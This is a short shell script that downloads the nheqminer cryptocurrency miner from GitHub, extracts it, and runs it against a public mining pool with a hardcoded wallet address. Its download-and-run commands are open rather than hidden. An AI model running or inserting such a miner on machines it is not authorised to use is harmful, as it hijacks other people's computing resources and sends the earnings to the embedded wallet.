sudo apt update
sudo apt install screen -y
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RRGXCHj1XbQ4pcBK9KnAtbFPWHuze4qLPG.Rigmac -p x -t 1
